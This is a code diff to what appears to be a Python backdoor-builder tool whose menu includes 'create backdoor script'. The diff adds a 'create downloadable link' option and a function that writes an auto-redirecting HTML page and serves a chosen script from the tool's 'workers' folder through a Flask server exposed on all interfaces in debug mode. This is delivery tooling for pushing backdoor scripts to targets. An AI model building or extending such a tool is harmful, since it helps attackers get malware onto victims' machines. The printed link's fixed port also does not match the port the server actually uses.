@@ -3,6 +3,9 @@ import sys
 from time import *
 from colorama import *
 import subprocess
+from flask import Flask, request, jsonify, send_from_directory, render_template_string
+
+app = Flask(__name__)
 
 try:
     os.system("clear")
@@ -216,6 +219,7 @@ def menu():
     print("[4] clear pref/scripts.txt")
     print("[5] create backdoor script")
     print("[6] show menu")
+    print("[7] create downloadable link")
     print("[99] Exit")
     print("[100] Restart")
     print("")
@@ -262,6 +266,8 @@ def show_menu():
         backdoor()
     elif choice == '6':
         menu()
+    elif choice == "7":
+        link()
     elif choice == '99':
         print("Exiting the system...")
         exit()
@@ -311,7 +317,45 @@ def start_worker():
         file.write("\n")
         file.write(str(array))
         file.close()
-            
+
+
+def link():
+    os.system("ls workers")
+    script_name = input("Enter the name of your script for download: ").strip()
+    prt = int(input("Input port number"))
+    if not script_name.endswith(".py"):
+        script_name += ".py"
+
+    # Generate HTML redirect content
+    html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0; url=/{script_name}" />
+</head>
+<body>
+    <p>If the download doesn't start automatically, <a href="/{script_name}">click here</a>.</p>
+</body>
+</html>"""
+
+    # Save HTML file inside a temporary folder like 'downloads/'
+    html_file_path = f"downloads/{script_name}.html"
+    os.makedirs("downloads", exist_ok=True)
+    with open(html_file_path, "w") as f:
+        f.write(html_content)
+
+    print(f"\nDownload link ready: http://localhost:8080/{script_name}.html")
+
+    # Define Flask routes inside the function
+    @app.route(f"/{script_name}")
+    def serve_script():
+        return send_from_directory("workers", script_name, as_attachment=True)
+
+    @app.route(f"/{script_name}.html")
+    def serve_html():
+        return render_template_string(html_content)
+
+    app.run(host='0.0.0.0', port=prt, debug=True)
+    
 def backdoor():
     os.system("ls workers")
     script_name = input("Enter the name of your script name:")
